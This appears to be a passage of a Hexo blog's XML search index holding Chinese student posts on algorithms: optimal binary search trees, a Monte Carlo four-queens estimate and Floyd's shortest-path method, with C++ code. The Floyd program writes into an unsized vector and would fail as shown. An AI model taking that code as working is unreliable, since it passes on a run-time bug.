function">backTrack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最优解为："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cout <span class="token operator">&lt;&lt;</span> x1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">}</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最大攻击力为："</span> <span class="token operator">&lt;&lt;</span> powermax <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="程序调试与结果展示"><a href="#程序调试与结果展示" class="headerlink" title="程序调试与结果展示"></a>程序调试与结果展示</h3><p><img src="https://img-blog.csdnimg.cn/20210714152217210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="结果截图"></p><h2 id="0x008-结束语"><a href="#0x008-结束语" class="headerlink" title="0x008 结束语"></a>0x008 结束语</h2><hr><blockquote><p><strong><em>别让怯懦否定了自己，别让懒惰耽误了青春</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最优二叉搜索树问题</title>
      <link href="posts/a294f3d3.html"/>
      <url>posts/a294f3d3.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  给定递增有序的元素序列$S=\left \langle a_1,a_2,\cdots,a_n\right \rangle$与相关存取概率分布$C=\left \langle q(0), p(1), q(1), p(2), q(2), \cdots, p(n), q(n) \right \rangle$，将这些元素存储在一棵二叉树的结点上，以查找$x$是否在这些数中。如果$x$不在，确定$x$在哪个空隙。设法构造一棵最优二叉搜索树使得平均查找次数$t$最小。一棵二叉搜索树的平均查找次数定义如下：</p><script type="math/tex; mode=display">t=\sum_{i=1}^{n}{p(i)(1+d(i))}+\sum_{j=0}^{n}{q(j)d(j)}</script><p>其中，$d(i)$表示结点$a<em>i$的深度，$i=1,2,\cdots, n$；$d(j)$表示空隙(叶子)结点$(a_j, a</em>{j+1})$的深度，$j=0,1,\cdots, n$。</p><h2 id="0x002-问题建模"><a href="#0x002-问题建模" class="headerlink" title="0x002 问题建模"></a>0x002 问题建模</h2><hr><h3 id="1-子问题的边界参数化"><a href="#1-子问题的边界参数化" class="headerlink" title="1.子问题的边界参数化"></a>1.子问题的边界参数化</h3><p>$S[i,j]=<x_i,x_{i+1}...x_j>$是$S$ 以$i$和$j$作为边界的子数据集，$C[i，j]=<a_{i-1},b_i,a_i,...,b_j,a_j>$是对应$S[i,j]$存取概率分布。<br>子问题划分：以$x_k$作为根划分成两个子问题</a_{i-1},b_i,a_i,...,b_j,a_j></x_i,x_{i+1}...x_j></p><script type="math/tex; mode=display">S[i,k-1],C[i，k-1]</script><script type="math/tex; mode=display">S[k+1,j],C[k+1，j]</script><h3 id="2-递推关系"><a href="#2-递推关系" class="headerlink" title="2.递推关系"></a>2.递推关系</h3><p>  设m[i,j]是相对于输入S[i,j]和C[i，j]的最优二叉搜索树的平均比较次数，令<script type="math/tex">w[i,j]=\sum_{p=i-1}^ja_p+\sum_{q=i}^jb_q</script>是C[i，j]中所有概率（包括数据元素与空隙）之和，则递推方程为</p><script type="math/tex; mode=display"> \begin{cases}   m[i,j]=\min \{m[i,k-1]+m[k+1,j]+w[i,j]\} &\text{if } 1\leq i\leq j \leq n \\    m[i,i-1]=0 &\text{if } i=1,2,...n\end{cases}</script><h3 id="3-备忘录表与标记函数表"><a href="#3-备忘录表与标记函数表" class="headerlink" title="3.备忘录表与标记函数表"></a>3.备忘录表与标记函数表</h3><p>  w:最优二叉搜索树的权;</p><p>  m:计算最优二叉搜索树的成本;</p><p>  r:最优二叉搜索树的根。</p><h2 id="0x003-算法的复杂度分析"><a href="#0x003-算法的复杂度分析" class="headerlink" title="0x003 算法的复杂度分析"></a>0x003 算法的复杂度分析</h2><hr><p>$i,j$的所有组合$O(n^2)$种，每种要对不同的k进行计算，$k=O(n)$每次计算为常数时间</p><script type="math/tex; mode=display">T(n)=O(n^3),S(n)=O(n^2)</script><h2 id="0x004-算法的迭代实现伪代码描述"><a href="#0x004-算法的迭代实现伪代码描述" class="headerlink" title="0x004 算法的迭代实现伪代码描述"></a>0x004 算法的迭代实现伪代码描述</h2><hr><pre class="line-numbers language-cpp{r," data-language="cpp{r,"><div class="caption"><span>tidy</span></div><code class="language-cpp{r,">function BST(p, q, n)let m[1...n+1,0...n],w[1...n+1,0...n] and r[1...n,1...n] be new tablesfor i = 1 → n + 1 dom[i, i − 1] ← 0w[i, i − 1] ← qi−1for l = 1 → n dofor i = 1 → n − l + 1 doj ← i + l − 1m[i, j] ← ∞w[i, j] ← w[i, j − 1] + pj + qjfor r = i → j dot ← m[i, r − 1] + m[r + 1, j] + w[i, j]if t &lt; m[i, j] thenm[i, j] ← tr[i, j] ← rreturn m, rend function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x005-迭代实现的源代码"><a href="#0x005-迭代实现的源代码" class="headerlink" title="0x005 迭代实现的源代码"></a>0x005 迭代实现的源代码</h2><hr><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> S<span class="token punctuation">,</span>C<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> w<span class="token punctuation">,</span>m<span class="token punctuation">,</span>r<span class="token punctuation">;</span><span class="token comment">//定义备忘录表 </span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> B<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span>S<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//输入集合S </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token operator">*</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">double</span> a<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span>C<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment">//输入存取概率，乘以100 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>B<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>m<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>w<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//初始化备忘录表</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>l <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>l <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token operator">-</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token operator">+</span>l<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> root <span class="token operator">=</span> i<span class="token punctuation">;</span>root <span class="token operator">&lt;=</span> j<span class="token punctuation">;</span>root <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> t <span class="token operator">=</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>root<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> m<span class="token punctuation">[</span>root<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>t <span class="token operator">&lt;</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//利用备忘录法迭代实现构造最优二叉搜索树 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cout <span class="token operator">&lt;&lt;</span> r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">}</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//输出记录根节点的表 </span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最小代价为"</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//输出最小期望代价 </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x006-运行结果截图"><a href="#0x006-运行结果截图" class="headerlink" title="0x006 运行结果截图"></a>0x006 运行结果截图</h2><hr><p><img src="https://img-blog.csdnimg.cn/20210714144305798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x007-结束语"><a href="#0x007-结束语" class="headerlink" title="0x007 结束语"></a>0x007 结束语</h2><hr><blockquote><p><strong><em>没有明确表达的爱意都是错觉</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MonteCarlo方法</title>
      <link href="posts/1960c1bd.html"/>
      <url>posts/1960c1bd.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-估计四皇后搜索树的结点数"><a href="#0x001-估计四皇后搜索树的结点数" class="headerlink" title="0x001 估计四皇后搜索树的结点数"></a>0x001 估计四皇后搜索树的结点数</h2><hr><ul><li>case1：&lt;1,4,2&gt;<br>第一行选择放在第一列（四选一），之后第二行可以放在第三、四列（二选一），第二行选择放在第四列，之后第三行只能放在第二列（一选一），第四行无法放。（搜索树中每条边代表一个选择）<br>$1+4+4\times 2+4\times 2=21$<br><img src="https://img-blog.csdnimg.cn/20210710182357741.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><!--1,4,2--></li><li>case2：&lt;2,4,1,3&gt;<br>第一行放在第二列（四选一）之后，其他三列位置固定（全是一选一）<br>$4\times 4 +1=17$<br><img src="https://img-blog.csdnimg.cn/20210710182702910.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><!--2,4,1,3--></li><li>case3：&lt;1,3&gt;<br>$1+4\times 1+4\times 2=13$<br><img src="https://img-blog.csdnimg.cn/20210710183326414.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><!--1,3--></li></ul><h2 id="0x002-结束语"><a href="#0x002-结束语" class="headerlink" title="0x002 结束语"></a>0x002 结束语</h2><hr><blockquote><p><strong><em>我有一瓢酒，可以慰风尘</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划_每对结点间的最短路径_Floyd</title>
      <link href="posts/9584e53f.html"/>
      <url>posts/9584e53f.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>设$G=(V,E)$是一个有$n$个结点的带权有向图，$w(i,j)$是权函数</p><script type="math/tex; mode=display"> w(i,j)=\begin{cases}   边<i,j>上的权值 &\text{if } <i,j>\in E \\   0 &\text{if } i=j\\    \infty &\text{if } <i,j>\notin E\end{cases}</script><p>每对结点间的最短路径问题是指图中任意一对结点$i$和$j$之间的最短路径。</p><h2 id="0x002-分析"><a href="#0x002-分析" class="headerlink" title="0x002 分析"></a>0x002 分析</h2><hr><p>Dijkstra算法要求图中的边的权为非负值，而本问题中允许边的权为负值，但不允许路径长度为负值的回路，因为若结点$i$到结点$j$的路径上存在负值回路，则意味着结点$i$到结点$j$没有最短路径。</p><h2 id="0x003-最优子结构特性"><a href="#0x003-最优子结构特性" class="headerlink" title="0x003 最优子结构特性"></a>0x003 最优子结构特性</h2><hr><p>设$G=(V,E)$是带权有向图，L(i,j)是从结点$i$到结点$j$的最短路径长度，$k$是这条路径上的一个结点，$L(i,k)$和$L(k,j)$分别是从$i$到$k$和从$k$到$j$的最短路径长度，则必有$L(i,j)=L(i,k)+L(k,j)$,若不然，则$L(i,j)$代表的路径就不是最短路径。</p><h2 id="0x004-最优解值的递推关系"><a href="#0x004-最优解值的递推关系" class="headerlink" title="0x004 最优解值的递推关系"></a>0x004 最优解值的递推关系</h2><hr><script type="math/tex; mode=display"> d_{-1}[i][j]=\begin{cases}   w(i,j) &\text{if } <i,j>\in E \\    \infty &\text{if } <i,j>\notin E\end{cases}</script><script type="math/tex; mode=display">d_k[i][j]=\min\{d_{k-1}[i][j],d_{k-1}[i][k]+d_{k-1}[k][j]\},1\leq k \leq n-1</script><p>其中$d<em>k[i][j]$表示从结点$i$到结点$j$的路径上，只允许包含编号不大于$k$的结点时，所以可能的路径中的最短路径的长度，$d</em>{-1}[i][j]$表示从$i$到$j$不包含结点（直达）的长度，$L(i,j)=d_{n-1}[i][j]$</p><h2 id="0x005-重叠子问题"><a href="#0x005-重叠子问题" class="headerlink" title="0x005 重叠子问题"></a>0x005 重叠子问题</h2><hr><p>为了计算$d<em>k[i][j]$时，必须计算$d</em>{k-1}[i][j],d<em>{k-1}[i][k],d</em>{k-1}[k][j]$</p><ul><li><p>邻接矩阵$a$存储有向图</p></li><li><p>二维数组$d$用于保存各条最短路径的长度，其中$d[i][j]$存放从结点$i$到结点$j$的最短路径的长度</p></li><li>二维数组$path$记录相应的最短路径，$path[i][j]$给出从结点$i$到结点$j$的最短路径中的前一个结点，可以反向追溯最短路径</li><li>初始时$d[i][j]=a[i][j]$</li><li>令$k=0,1,…,n-1$,每次考察一个结点$k$</li><li>在算法的第$k$步上应作出决策：从$i$到$j$的最短路径上是否包含结点$k$</li></ul><h2 id="0x006-程序"><a href="#0x006-程序" class="headerlink" title="0x006 程序"></a>0x006 程序</h2><hr><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> a<span class="token punctuation">;</span><span class="token comment">//邻接矩阵</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> d<span class="token punctuation">;</span><span class="token comment">//保存每对结点之间最短路径</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> path<span class="token punctuation">;</span><span class="token comment">//标记函数</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//结点数</span><span class="token comment">//创建邻接矩阵</span><span class="token keyword">void</span> <span class="token function">CreateA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> v<span class="token punctuation">;</span><span class="token keyword">int</span> v1<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin <span class="token operator">&gt;&gt;</span> v1<span class="token punctuation">;</span>v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>a<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">allPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//初始化d</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//迭代：对于点k，若i直接到j的距离大于1-&gt;k-&gt;j的距离和时，改写d[i][j]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>k <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>k <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span>d<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">CreateA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">allPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" 